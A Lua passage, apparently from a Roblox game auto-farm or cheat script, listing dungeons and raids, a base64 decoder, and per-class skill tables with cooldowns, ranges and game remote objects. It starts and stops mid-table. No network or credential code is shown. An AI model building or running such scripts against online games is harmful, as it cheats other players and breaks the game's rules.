    Id = 42,
    Name = "Astral Academy",
    World = 10,
    Type = 'Dungeon',
    Code = '10-2'
}, {
    Id = 43,
    Name = "Arcane Tower",
    World = 10,
    Type = 'Tower',
    Code = 'Tower 6'
}, {
    Id = 22,
    Name = "Haunted Event",
    Type = 'Raid',
    World = "Spooky Courtyard",
    Special = true,
    Code = 'Halloween Raid'
}, {
    Id = 17,
    Name = "North Pole",
    Type = 'Raid',
    World = "Holiday Village",
    Special = true,
    Code = 'Christmas Raid'
}, {
    Id = 38,
    Name = "Infinite Tower",
    Type = 'Special',
    Special = true,
    Code = 'Special'
}, {
    Id = 39,
    Name = "Celestial Tower",
    Type = 'Special',
    Special = true,
    Code = 'Special'
}, {
    Id = 40,
    Name = "Daily Dungeon",
    Type = 'Dungeon',
    Special = true,
    Code = 'I dont know'
}, {
    Id = 44,
    Name = "Vane's Lair",
    Type = 'Raid',
    Special = true,
    Code = 'Event Raid'
}, {
    Id = 45,
    Name = "The Depths",
    Type = 'Raid',
    Special = true,
    Code = 'Event Raid'
}}
local function cf(J)
    local cg = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    J = J:gsub('[^' .. cg .. '=]', '')
    return J:gsub('.', function(ch)
        if ch == '=' then
            return ''
        end
        local ci, cj = '', cg:find(ch) - 1;
        for z = 6, 1, -1 do
            ci = ci .. (cj % 2 ^ z - cj % 2 ^ (z - 1) > 0 and '1' or '0')
        end
        return ci
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(ch)
        if #ch ~= 8 then
            return ''
        end
        local ck = 0;
        for z = 1, 8 do
            ck = ck + (ch:sub(z, z) == '1' and 2 ^ (8 - z) or 0)
        end
        return string.char(ck)
    end)
end
local cl = {
    Assassin = {
        DisplayName = 'Shadowblade',
        Range = 10.5,
        Type = 'Melee',
        Primary = 'Longsword',
        Offhand = 'Longsword',
        Skills = {{
            Skill = 'Assassin1',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin2',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin3',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin4',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin5',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin6',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin7',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin8',
            Cooldown = 0.26
        }, {
            Skill = 'ShadowLeap',
            Cooldown = 3.1,
            Range = 49
        }, {
            Skill = 'ShadowSlash1',
            Cooldown = 6.1,
            Range = 59
        }, {
            Skill = 'ShadowSlash2',
            Cooldown = 6.1,
            Range = 59
        }, {
            Skill = bc:WaitForChild('Assassin'):WaitForChild('EventStealthWalk'),
            Cooldown = 0.25,
            Type = 'Remote'
        }, {
            Skill = bc:WaitForChild('Assassin'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }, {
            Skill = 'RealmOfShadows',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 79
        }, {
            Skill = 'ShadowMulti1',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }, {
            Skill = 'ShadowMulti2',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }, {
            Skill = 'ShadowMulti3',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }, {
            Skill = 'ShadowMulti4',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }, {
            Skill = 'ShadowMulti5',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }}
    },
    MageOfLight = {
        DisplayName = 'Mage Of Light',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'MageOfLight',
            Cooldown = 0.28
        }, {
            Skill = 'MageOfLightBlast',
            Cooldown = 0.33
        }, {
            Skill = 'MageOfLightCharged',
            Cooldown = 0.33
        }, {
            Skill = 'MageOfLightBlastCharged',
            Cooldown = 0.33
        }, {
            Skill = bc:WaitForChild('MageOfLight'):WaitForChild('HealCircle'),
            Cooldown = 14.2,
            Type = 'Heal'
        }, {
            Skill = bc:WaitForChild('MageOfLight'):WaitForChild('Barrier'),
            Args = c,
            Cooldown = 15.2,
            Type = 'Heal'
        }, {
            Skill = bc:WaitForChild('MageOfLight'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Heal'
        }}
    },
    Warlord = {
        DisplayName = 'Warlord',
        Range = 19.5,
        Type = 'Melee',
        Primary = 'Greataxe',
        Offhand = 'Shield',
        Skills = {{
            Skill = 'Warlord1',
            Cooldown = 0.42,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'Warlord2',
            Cooldown = 0.42,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'Warlord3',
            Cooldown = 0.42,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'Warlord4',
            Cooldown = 0.42,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'ChainsOfWar',
            Cooldown = 8,
            Range = 69,
            Type = 'Ranged'
        }, {
            Skill = 'BlockingWarlord',
            Cooldown = 2.5,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'Piledriver1',
            Cooldown = 5.1,
            Range = 12,
            Type = 'Ranged'
        }, {
            Skill = 'Piledriver2',
            Cooldown = 6.1,
            Range = 12,
            Type = 'Ranged'
        }, {
            Skill = 'Piledriver3',
            Cooldown = 7.1,
            Range = 12,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate1',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate2',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate3',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate4',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate5',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }}
    },
    Paladin = {
        DisplayName = 'Paladin',
        Range = 14,
        Type = 'Melee',
        Primary = 'Longsword',
        Offhand = 'Shield',
        Skills = {{
            Skill = 'BlockingPaladin',
            Cooldown = 0.37,
            Range = 9
        }, {
            Skill = 'Paladin1',
            Cooldown = 0.52
        }, {
            Skill = 'Paladin2',
            Cooldown = 0.52
        }, {
            Skill = 'Paladin3',
            Cooldown = 0.52
        }, {
            Skill = 'Paladin4',
            Cooldown = 0.52
        }, {
            Skill = 'LightPaladin1',
            Cooldown = 0.52,
            Range = 19
        }, {
            Skill = 'LightPaladin2',
            Cooldown = 0.52,
            Range = 19
        }, {
            Skill = 'LightPaladin3',
            Cooldown = 0.52,
            Range = 19
        }, {
            Skill = 'LightPaladin4',
            Cooldown = 0.52,
            Range = 19
        }, {
            Skill = 'LightThrust1',
            Cooldown = 9,
            Range = 19
        }, {
            Skill = 'LightThrust2',
            Cooldown = 9,
            Range = 19
        }, {
            Skill = bc:WaitForChild('Paladin'):WaitForChild('GuildedLight'),
            Cooldown = 15.2,
            Type = 'Heal'
        }}
    },
    Berserker = {
        DisplayName = 'Berserker',
        Range = 19.5,
        Type = 'Melee',
        Primary = 'Greataxe',
        Offhand = 'Greataxe',
        Skills = {{
            Skill = 'Berserker1',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker2',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker3',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker4',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker5',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker6',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'AggroSlam',
            Cooldown = 5.2,
            Range = 39,
            Type = 'Ranged'
        }, {
            Skill = 'GigaSpin1',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin2',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin3',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin4',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin5',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin6',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin7',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin8',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'Fissure1',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'Fissure2',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt1',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt2',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt3',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt4',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt5',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt6',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt7',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt8',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = bc:WaitForChild('Berserker'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }}
    },
    Guardian = {
        DisplayName = 'Guardian',
        Range = 14.5,
        Type = 'Melee',
        Primary = 'Greatsword',
        Skills = {{
            Skill = 'Guardian1',
            Cooldown = 0.6
        }, {
            Skill = 'Guardian2',
            Cooldown = 0.6
        }, {
            Skill = 'Guardian3',
            Cooldown = 0.6
        }, {
            Skill = 'Guardian4',
            Cooldown = 0.6
        }, {
            Skill = 'RockSpikes1',
            Cooldown = 6.1,
            Range = 29,
            Type = 'Ranged'
        }, {
            Skill = 'RockSpikes2',
            Cooldown = 6.1,
            Range = 31,
            Type = 'Ranged'
        }, {
            Skill = 'RockSpikes3',
            Cooldown = 6.1,
            Range = 34,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury1',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury2',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury3',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury4',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury5',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury6',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury7',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury8',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = bc:WaitForChild('Guardian'):WaitForChild('AggroDraw'),
            Cooldown = 14.5,
            Type = 'Remote'
        }, {
            Skill = 'SwordPrison1',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison2',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison3',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison4',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison5',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison6',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison7',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison8',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison9',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison10',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison11',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison12',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }}
    },
    Demon = {
        DisplayName = 'Demon',
        Range = 12,
        Type = 'Ranged',
        Primary = 'Scythe',
        Skills = {{
            Skill = 'Demon1',
            Cooldown = 0.85
        }, {
            Skill = 'Demon2',
            Cooldown = 0.85
        }, {
            Skill = 'Demon3',
            Cooldown = 0.85
        }, {
            Skill = 'Demon4',
            Cooldown = 1.2
        }, {
            Skill = 'Demon5',
            Cooldown = 1.2
        }, {
            Skill = 'Demon6',
            Cooldown = 1.2
        }, {
            Skill = 'Demon7',
            Cooldown = 1.5
        }, {
            Skill = 'Demon8',
            Cooldown = 1.5
        }, {
            Skill = 'Demon9',
            Cooldown = 1.5
        }, {
            Skill = 'Demon10',
            Cooldown = 1.85
        }, {
            Skill = 'Demon11',
            Cooldown = 1.85
        }, {
            Skill = 'Demon12',
            Cooldown = 1.85
        }, {
            Skill = 'Demon13',
            Cooldown = 2.15
        }, {
            Skill = 'Demon14',
            Cooldown = 2.15
        }, {
            Skill = 'Demon15',
            Cooldown = 2.15
        }, {
            Skill = 'Demon16',
            Cooldown = 2.55
        }, {
            Skill = 'Demon17',
            Cooldown = 2.55
        }, {
            Skill = 'Demon18',
            Cooldown = 2.55
        }, {
            Skill = 'Demon19',
            Cooldown = 2.85
        }, {
            Skill = 'Demon20',
            Cooldown = 2.85
        }, {
            Skill = 'Demon21',
            Cooldown = 2.85
        }, {
            Skill = 'Demon22',
            Cooldown = 3.2
        }, {
            Skill = 'Demon23',
            Cooldown = 3.2
        }, {
            Skill = 'Demon24',
            Cooldown = 3.2
        }, {
            Skill = 'Demon25',
            Cooldown = 3.5
        }, {
            Skill = 'Demon26',
            Cooldown = 3.5
        }, {
            Skill = 'Demon27',
            Cooldown = 3.5
        }, {
            Skill = 'DemonDPS1',
            Cooldown = 0.85,
            Range = 12
        }, {
            Skill = 'DemonDPS2',
            Cooldown = 1.2,
            Range = 12
        }, {
            Skill = 'DemonDPS3',
            Cooldown = 1.5,
            Range = 12
        }, {
            Skill = 'DemonDPS4',
            Cooldown = 1.85,
            Range = 12
        }, {
            Skill = 'DemonDPS5',
            Cooldown = 2.15,
            Range = 12
        }, {
            Skill = 'DemonDPS6',
            Cooldown = 2.55,
            Range = 12
        }, {
            Skill = 'DemonDPS7',
            Cooldown = 2.9,
            Range = 12
        }, {
            Skill = 'DemonDPS8',
            Cooldown = 3.3,
            Range = 12
        }, {
            Skill = 'DemonDPS9',
            Cooldown = 3.6,
            Range = 12
        }, {
            Skill = 'ScytheThrowDPS1',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 71
        }, {
            Skill = 'ScytheThrowDPS2',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 71
        }, {
            Skill = 'ScytheThrowDPS3',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 71
        }, {
            Skill = 'ScytheThrow1',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow2',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow3',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow4',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow5',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow6',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow7',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow8',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'DemonLifeStealDPS',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 56
        }, {
            Skill = bc:WaitForChild('Demon'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }, {
            Skill = 'DemonSoulDPS1',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 26
        }, {
            Skill = 'DemonSoulDPS2',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 26
        }, {
            Skill = 'DemonSoulDPS3',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 26
        }}
    },
    Swordmaster = {
        DisplayName = 'Swordmaster',
        Range = 14,
        Type = 'Melee',
        Primary = 'Longsword',
        Skills = {{
            Skill = 'Swordmaster1',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster2',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster3',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster4',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster5',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster6',
            Cooldown = 0.33
        }, {
            Skill = 'CrescentStrike1',
            Cooldown = 5.2
        }, {
            Skill = 'CrescentStrike2',
            Cooldown = 5.2
        }, {
            Skill = 'CrescentStrike3',
            Cooldown = 5.2
        }, {
            Skill = 'CrescentStrike4',
            Cooldown = 5.2
        }, {
            Skill = 'CrescentStrike5',
            Cooldown = 5.2
        }, {
            Skill = 'Leap',
            Cooldown = 8.2,
            Range = 14
        }}
    },
    Mage = {
        DisplayName = 'Arcane Mage',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'Mage1',
            Cooldown = 0.33
        }, {
            Skill = 'Mage2',
            Cooldown = 0.33
        }, {
            Skill = 'Mage3',
            Cooldown = 0.33
        }, {
            Skill = 'ArcaneBlast',
            Cooldown = 5.2,
            Range = 42
        }, {
            Skill = 'ArcaneBlastAOE',
            Cooldown = 5.2,
            Range = 42
        }, {
            Skill = 'ArcaneWave1',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave2',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave3',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave4',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave5',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave6',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave7',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave8',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave9',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave10',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave11',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave12',
            Cooldown = 8.2,
            Range = 36
        }}
    },
    Defender = {
        DisplayName = 'Defender',
        Range = 12,
        Type = 'Melee',
        Primary = 'Greataxe',
        Skills = {{
            Skill = 'Defender1',
            Cooldown = 0.66
        }, {
            Skill = 'Defender2',
            Cooldown = 0.66
        }, {
            Skill = 'Defender3',
            Cooldown = 0.66
        }, {
            Skill = 'Defender4',
            Cooldown = 0.66
        }, {
            Skill = 'Defender5',
            Cooldown = 0.66
        }, {
            Skill = 'Groundbreaker',
            Cooldown = 5.1,
            Range = 9
        }, {
            Skill = 'Spin1',
            Cooldown = 8.1,
            Range = 10
        }, {
            Skill = 'Spin2',
            Cooldown = 8.1,
            Range = 10
        }, {
            Skill = 'Spin3',
            Cooldown = 8.1,
            Range = 10
        }, {
            Skill = 'Spin4',
            Cooldown = 8.1,
            Range = 10
        }}
    },
    DualWielder = {
        DisplayName = 'Dual Wielder',
        Range = 12,
        Type = 'Melee',
        Primary = 'Longsword',
        Offhand = 'Longsword',
        Skills = {{
            Skill = 'DualWield1',
            Cooldown = 0.55
        }, {
            Skill = 'DualWield2',
            Cooldown = 0.55
        }, {
            Skill = 'DualWield3',
            Cooldown = 0.55
        }, {
            Skill = 'DualWield4',
            Cooldown = 0.55
        }, {
            Skill = 'DualWield5',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield6',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield7',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield8',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield9',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield10',
            Cooldown = 0.75
        }, {
            Skill = bc:WaitForChild('DualWielder'):WaitForChild('AttackBuff'),
            Cooldown = 12.2,
            Type = 'Remote'
        }, {
            Skill = 'DashStrike',
            Cooldown = 6.2
        }, {
            Skill = 'CrossSlash1',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash2',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash3',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash4',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash5',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash6',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash7',
            Cooldown = 8 - 2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash8',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash9',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash10',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = bc:WaitForChild('DualWielder'):WaitForChild('Ultimate'),
            Cooldown = 31,
            Type = 'Remote'
        }, {
            Skill = 'DualWieldUltimateHit1',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit2',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit3',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit4',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit5',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit6',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit7',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit8',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateSlam',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSlam1',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSlam2',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSlam3',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword1',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword2',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword3',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword4',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword5',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword6',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword7',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword8',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword9',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword10',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword11',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword12',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword13',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword14',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword15',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword16',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }}
    },
    IcefireMage = {
        DisplayName = 'Elementalist',
        Range = 93,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'IcefireMage1',
            Cooldown = 0.33
        }, {
            Skill = 'IcefireMage2',
            Cooldown = 0.33
        }, {
            Skill = 'IcefireMage3',
            Cooldown = 0.33
        }, {
            Skill = 'IcySpikes1',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcySpikes2',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcySpikes3',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcySpikes4',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcySpikes5',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcefireMageFireball',
            Cooldown = 10.2
        }, {
            Skill = 'IcefireMageFireballBlast',
            Cooldown = 10.2
        }, {
            Skill = 'LightningStrike1',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'LightningStrike2',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'LightningStrike3',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'LightningStrike4',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'LightningStrike5',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'IcefireMageUltimateFrost',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor1',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor2',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor3',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor4',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor5',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor6',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor7',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor8',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor9',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor10',
            Cooldown = 31,
            Range = 56
        }}
    },
    Dragoon = {
        DisplayName = 'Dragoon',
        Range = 12,
        Type = 'Ranged',
        Primary = 'Spear',
        Skills = {{
            Skill = 'Dragoon1',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon2',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon3',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon4',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon5',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon6',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'DragoonDash',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross1',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross2',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross3',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross4',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross5',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross6',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross7',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross8',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross9',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross10',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'MultiStrike1',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrike2',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrike3',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrike4',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrike5',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrikeDragon1',
            Cooldown = 6.2,
            Range = 57
        }, {
            Skill = 'MultiStrikeDragon2',
            Cooldown = 6.2,
            Range = 57
        }, {
            Skill = 'MultiStrikeDragon3',
            Cooldown = 6.2,
            Range = 57
        }, {
            Skill = 'DragoonFall',
            Cooldown = 8.2,
            Range = 5
        }, {
